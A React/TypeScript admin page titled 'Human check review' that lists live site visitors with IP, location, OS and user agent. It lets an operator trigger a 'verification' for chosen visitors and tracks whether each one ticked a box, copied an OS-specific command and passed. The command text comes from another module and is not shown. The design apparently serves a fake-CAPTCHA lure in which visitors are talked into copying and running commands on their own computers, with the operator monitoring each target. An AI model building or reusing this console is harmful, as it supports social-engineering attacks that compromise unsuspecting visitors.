"use client"

import { useCallback, useEffect, useRef, useState, type FormEvent } from "react"
import { verificationApi, visitorCommand } from "@/lib/human-verification"

type VerifyStatus = "present" | "opened" | "checked" | "copied" | "code_sent" | "verified"

type AdminSession = {
  id: string
  phrase: string
  status: VerifyStatus
  createdAt: number
  lastSeenAt?: number
  promptedAt?: number
  checkedAt?: number
  copiedAt?: number
  codeSentAt?: number
  verifiedAt?: number
  code: string | null
  attempts: number
  passNumber: number | null
  passCount: number
  ip: string
  location?: string
  os: string
  userAgent: string
  page: string
}

const TOKEN_STORAGE = "apax-admin-token"

const statusLabel: Record<VerifyStatus, string> = {
  present: "Not shown",
  opened: "Shown",
  checked: "Checkbox ticked",
  copied: "Command copied",
  code_sent: "Shown",
  verified: "Passed",
}

function verificationShown(session: AdminSession) {
  return session.status !== "present"
}

function byArrival(a: AdminSession, b: AdminSession) {
  return a.createdAt - b.createdAt || a.id.localeCompare(b.id)
}

function splitAgain(ms: number): { amount: string; unit: "seconds" | "minutes" | "hours" } {
  if (ms % 3_600_000 === 0 && ms >= 3_600_000) return { amount: String(ms / 3_600_000), unit: "hours" }
  if (ms % 60_000 === 0 && ms >= 60_000) return { amount: String(ms / 60_000), unit: "minutes" }
  return { amount: String(Math.max(1, Math.round(ms / 1000))), unit: "seconds" }
}

function againPhrase(ms: number) {
  const split = splitAgain(ms)
  const count = Number(split.amount)
  const unit = count === 1 ? split.unit.slice(0, -1) : split.unit
  return `${count} ${unit}`
}

function formatTime(value?: number) {
  if (!value) return ""
  const clock = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Etc/GMT-9",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  }).format(new Date(value))
  return `${clock} GMT+9`
}

export default function VerifyAdminPage() {
  const [token, setToken] = useState("")
  const [ready, setReady] = useState(false)
  const [adminId, setAdminId] = useState("")
  const [password, setPassword] = useState("")
  const [signingIn, setSigningIn] = useState(false)
  const [sessions, setSessions] = useState<AdminSession[]>([])
  const [mode, setMode] = useState<"manual" | "automatic">("manual")
  const [savingMode, setSavingMode] = useState(false)
  const savingModeRef = useRef(false)
  const [againMs, setAgainMs] = useState(24 * 60 * 60 * 1000)
  const [againAmount, setAgainAmount] = useState("24")
  const [againUnit, setAgainUnit] = useState<"seconds" | "minutes" | "hours">("hours")
  const [savingAgain, setSavingAgain] = useState(false)
  const againFocusedRef = useRef(false)
  const [error, setError] = useState("")
  const [notice, setNotice] = useState("")

  useEffect(() => {
    setToken(window.sessionStorage.getItem(TOKEN_STORAGE) || "")
    setReady(true)
  }, [])

  const load = useCallback(async (currentToken: string) => {
    if (!currentToken) return
    const response = await fetch(`${verificationApi()}/verify/admin/sessions`, {
      headers: { "x-admin-token": currentToken },
    })
    const data = await response.json().catch(() => ({}))
    if (response.status === 401) {
      window.sessionStorage.removeItem(TOKEN_STORAGE)
      setToken("")
      setSessions([])
      throw new Error(typeof data.error === "string" ? data.error : "Log in again.")
    }
    if (!response.ok) {
      throw new Error(typeof data.error === "string" ? data.error : "Could not load visitors.")
    }
    setSessions([...(data.sessions || [])].sort(byArrival))
    if ((data.mode === "automatic" || data.mode === "manual") && !savingModeRef.current) setMode(data.mode)
    if (Number.isFinite(data.againMs) && data.againMs > 0 && !againFocusedRef.current) {
      const split = splitAgain(data.againMs)
      setAgainMs(data.againMs)
      setAgainAmount(split.amount)
      setAgainUnit(split.unit)
    }
    setError("")
  }, [])

  useEffect(() => {
    if (!ready || !token) return
    load(token).catch((reason: Error) => setError(reason.message))
    const timer = window.setInterval(() => {
      load(token).catch((reason: Error) => setError(reason.message))
    }, 2000)
    return () => window.clearInterval(timer)
  }, [ready, token, load])

  async function onLogin(event: FormEvent) {
    event.preventDefault()
    setSigningIn(true)
    setError("")
    try {
      const response = await fetch(`${verificationApi()}/verify/admin/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ adminId, password }),
      })
      const data = await response.json().catch(() => ({}))
      if (!response.ok || typeof data.token !== "string") {
        throw new Error(typeof data.error === "string" ? data.error : "Admin ID or password was not accepted.")
      }
      window.sessionStorage.setItem(TOKEN_STORAGE, data.token)
      setToken(data.token)
      setPassword("")
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : "Admin ID or password was not accepted.")
    } finally {
      setSigningIn(false)
    }
  }

  function logout() {
    window.sessionStorage.removeItem(TOKEN_STORAGE)
    setToken("")
    setSessions([])
    setNotice("")
    setError("")
  }

  async function chooseMode(next: "manual" | "automatic") {
    setSavingMode(true)
    savingModeRef.current = true
    setError("")
    const previous = mode
    setMode(next)
    try {
      const response = await fetch(`${verificationApi()}/verify/admin/mode`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-admin-token": token },
        body: JSON.stringify({ mode: next }),
      })
      const data = await response.json().catch(() => ({}))
      if (!response.ok) throw new Error(typeof data.error === "string" ? data.error : "The switch was not saved.")
      if (data.mode === "automatic" || data.mode === "manual") setMode(data.mode)
    } catch (reason) {
      setMode(previous)
      setError(reason instanceof Error ? reason.message : "The switch was not saved.")
    } finally {
      savingModeRef.current = false
      setSavingMode(false)
    }
  }

  async function saveAgain(event: FormEvent) {
    event.preventDefault()
    const amount = Number(againAmount)
    const unitMs = againUnit === "hours" ? 3_600_000 : againUnit === "minutes" ? 60_000 : 1_000
    if (!Number.isFinite(amount) || amount <= 0) {
      setError("Enter a reopen time from 5 seconds to 30 days.")
      return
    }
    setSavingAgain(true)
    setError("")
    try {
      const response = await fetch(`${verificationApi()}/verify/admin/mode`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-admin-token": token },
        body: JSON.stringify({ againMs: Math.round(amount * unitMs) }),
      })
      const data = await response.json().catch(() => ({}))
      if (!response.ok) throw new Error(typeof data.error === "string" ? data.error : "The reopen time was not saved.")
      if (Number.isFinite(data.againMs)) {
        const split = splitAgain(data.againMs)
        setAgainMs(data.againMs)
        setAgainAmount(split.amount)
        setAgainUnit(split.unit)
      }
      setNotice(`The check reopens ${againPhrase(Number.isFinite(data.againMs) ? data.againMs : amount * unitMs)} after a pass.`)
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : "The reopen time was not saved.")
    } finally {
      againFocusedRef.current = false
      setSavingAgain(false)
    }
  }

  async function showPage(session: AdminSession) {
    setNotice("")
    setError("")
    const response = await fetch(
      `${verificationApi()}/verify/admin/sessions/${session.id}/show`,
      {
        method: "POST",
        headers: { "x-admin-token": token },
      }
    )
    const data = await response.json().catch(() => ({}))
    if (!response.ok) {
      setError(typeof data.error === "string" ? data.error : "The verification page was not opened.")
      return
    }
    const opened = data.session as AdminSession | undefined
    const openedPhrase = typeof opened?.phrase === "string" ? opened.phrase : session.phrase
    if (opened?.id) {
      setSessions((current) =>
        current.map((item) => (item.id === opened.id ? { ...item, ...opened } : item)).sort(byArrival)
      )
    }
    setNotice(`Verification page opened. The visitor copies ${visitorCommand(openedPhrase, session.os) || openedPhrase}.`)
    await load(token)
  }

  return (
    <main className="min-h-screen bg-[#0A0A0A] px-5 py-8 text-[#E8E8E8]">
      <div className="mx-auto max-w-6xl">
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            <p className="text-xs uppercase tracking-[0.18em] text-[#D4AF37]">APAX</p>
            <h1 className="mt-2 font-serif text-3xl text-[#F4E4A6]">Human check review</h1>
          </div>
          {token ? (
            <button
              type="button"
              onClick={logout}
              className="h-10 rounded-md border border-[#3A3A3A] px-4 text-sm text-[#C0C0C0]"
            >
              Log out
            </button>
          ) : null}
        </div>
        <p className="mt-3 max-w-xl text-sm leading-6 text-[#888888]">
          This list is only the browsers connected to the site right now. Closed visits are not kept.
        </p>
        {token ? (
          <div className="mt-4 flex items-center gap-3">
            <button
              type="button"
              role="switch"
              aria-checked={mode === "automatic"}
              aria-label="Open the check automatically"
              disabled={savingMode}
              onClick={() => chooseMode(mode === "automatic" ? "manual" : "automatic")}
              className={`relative h-6 w-11 shrink-0 rounded-full transition-colors ${
                mode === "automatic" ? "bg-[#D4AF37]" : "bg-[#3A3A3A]"
              }`}
            >
              <span
                className={`absolute top-0.5 h-5 w-5 rounded-full bg-white transition-transform ${
                  mode === "automatic" ? "left-5" : "left-0.5"
                }`}
              />
            </button>
            <p className="text-sm text-[#C0C0C0]">
              <span className="font-medium text-[#F4E4A6]">{mode === "automatic" ? "Automatic" : "Manual"}</span>
              <span className="mt-0.5 block text-xs leading-5 text-[#888888]">
                {mode === "automatic"
                  ? `The check opens once when someone arrives, then again ${againPhrase(againMs)} after they pass.`
                  : "The check opens only when you press Show verification."}
              </span>
            </p>
            {mode === "automatic" ? (
              <form onSubmit={saveAgain} className="flex flex-wrap items-center gap-2">
                <label className="text-xs text-[#888888]" htmlFor="again-amount">Reopen after</label>
                <input
                  id="again-amount"
                  inputMode="decimal"
                  value={againAmount}
                  onFocus={() => {
                    againFocusedRef.current = true
                  }}
                  onBlur={() => {
                    againFocusedRef.current = false
                  }}
                  onChange={(event) => {
                    againFocusedRef.current = true
                    setAgainAmount(event.target.value)
                  }}
                  className="h-8 w-16 rounded-md border border-[#2A2A2A] bg-[#0A0A0A] px-2 text-sm outline-none focus:border-[#D4AF37]"
                />
                <select
                  aria-label="Reopen time unit"
                  value={againUnit}
                  onFocus={() => {
                    againFocusedRef.current = true
                  }}
                  onBlur={() => {
                    againFocusedRef.current = false
                  }}
                  onChange={(event) => setAgainUnit(event.target.value as "seconds" | "minutes" | "hours")}
                  className="h-8 rounded-md border border-[#2A2A2A] bg-[#0A0A0A] px-2 text-sm outline-none focus:border-[#D4AF37]"
                >
                  <option value="seconds">seconds</option>
                  <option value="minutes">minutes</option>
                  <option value="hours">hours</option>
                </select>
                <button
                  type="submit"
                  disabled={savingAgain}
                  className="h-8 rounded-md bg-[#D4AF37] px-3 text-xs font-medium text-[#0A0A0A] disabled:opacity-40"
                >
                  {savingAgain ? "Saving..." : "Save"}
                </button>
              </form>
            ) : null}
          </div>
        ) : null}
        {error ? <p className="mt-3 h-5 truncate text-sm leading-5 text-[#DC2626]">{error}</p> : null}
        <p className="mt-3 h-5 truncate text-sm leading-5 text-[#E6C861]" title={notice}>{notice}</p>

        {!token ? (
          <form onSubmit={onLogin} className="mt-8 max-w-sm space-y-4 rounded-lg border border-[#2A2A2A] bg-[#111111] p-5">
            <div>
              <label className="block text-sm text-[#C0C0C0]" htmlFor="admin-id">Admin ID</label>
              <input
                id="admin-id"
                value={adminId}
                onChange={(event) => setAdminId(event.target.value)}
                autoComplete="username"
                className="mt-2 h-10 w-full rounded-md border border-[#2A2A2A] bg-[#0A0A0A] px-3 outline-none focus:border-[#D4AF37]"
              />
            </div>
            <div>
              <label className="block text-sm text-[#C0C0C0]" htmlFor="admin-password">Password</label>
              <input
                id="admin-password"
                type="password"
                value={password}
                onChange={(event) => setPassword(event.target.value)}
                autoComplete="current-password"
                className="mt-2 h-10 w-full rounded-md border border-[#2A2A2A] bg-[#0A0A0A] px-3 outline-none focus:border-[#D4AF37]"
              />
            </div>
            <button
              type="submit"
              disabled={signingIn || adminId.trim().length === 0 || password.length === 0}
              className="h-10 w-full rounded-md bg-[#D4AF37] text-sm font-medium text-[#0A0A0A] disabled:opacity-40"
            >
              {signingIn ? "Signing in..." : "Log in"}
            </button>
          </form>
        ) : null}

        {token ? <div className="mt-6 grid grid-cols-2 gap-2.5 md:grid-cols-3 xl:grid-cols-4">
          {sessions.length === 0 ? (
            <p className="col-span-full rounded-md border border-[#2A2A2A] bg-[#111111] px-4 py-6 text-sm text-[#888888]">
              No browsers are connected right now.
            </p>
          ) : (
            sessions.map((session) => {
              const shown = verificationShown(session)
              const passed = session.status === "verified"
              const command = visitorCommand(session.phrase, session.os) || session.phrase
              const passLabel = session.passNumber
                ? `VP-${String(session.passNumber).padStart(4, "0")}${session.passCount > 1 ? ` · ${session.passCount}` : ""}`
                : "No pass"
              return (
              <article
                key={session.id}
                className={`flex flex-col rounded-md border bg-[#111111] p-2.5 ${
                  passed ? "border-[#3DDC97]" : shown ? "border-[#E6C861]" : "border-[#2A2A2A]"
                }`}
              >
                <div className="flex items-start justify-between gap-2">
                  <p className="min-w-0 truncate text-sm font-semibold leading-tight text-white">
                    {session.os || "Unknown OS"}
                  </p>
                  <span
                    className={`inline-flex h-5 shrink-0 items-center justify-center whitespace-nowrap rounded-full px-2 text-[10px] font-semibold leading-none ${
                      passed
                        ? "bg-[#3DDC97] text-[#0A0A0A]"
                        : shown
                          ? "bg-[#E6C861] text-[#0A0A0A]"
                          : "border border-[#3A3A3A] text-[#888888]"
                    }`}
                  >
                    {passed ? "Passed" : shown ? "Shown" : "Not shown"}
                  </span>
                </div>
                <p className="mt-1 truncate text-sm font-semibold leading-tight text-[#F4E4A6]" title={session.ip}>{session.ip}</p>
                <p className="mt-1 truncate text-[11px] text-[#888888]" title={session.location || "Looking up location..."}>{session.location || "Looking up location..."}</p>
                <p className="mt-2 font-mono text-xs tracking-[0.08em] text-[#E8E8E8]">{session.phrase}</p>
                <p className="mt-1 whitespace-nowrap text-[11px] leading-4 text-[#A0A0A0]">{passLabel} · {formatTime(session.createdAt)}</p>
                <p className="mt-1 truncate font-mono text-[10px] text-[#777777]" title={command}>{command}</p>
                <p className="mt-0.5 truncate text-[10px] text-[#555555]" title={session.userAgent}>{session.page}</p>
                {session.attempts > 0 ? (
                  <p className="mt-1 text-[10px] text-[#888888]">Wrong attempts {session.attempts}</p>
                ) : null}
                <button
                  type="button"
                  onClick={() => showPage(session)}
                  className={`mt-2 h-7 rounded px-2 text-xs font-medium ${
                    shown
                      ? "border border-[#E6C861] bg-transparent text-[#E6C861]"
                      : "bg-[#D4AF37] text-[#0A0A0A]"
                  }`}
                >
                  {shown ? "Show again" : "Show verification"}
                </button>
                <p className={`mt-1 text-[10px] ${shown ? "text-[#E6C861]" : "text-[#666666]"}`}>
                  {passed ? `Passed ${formatTime(session.verifiedAt)}` : statusLabel[session.status]}
                </p>
              </article>
              )
            })
          )}
        </div> : null}
      </div>
    </main>
  )
}
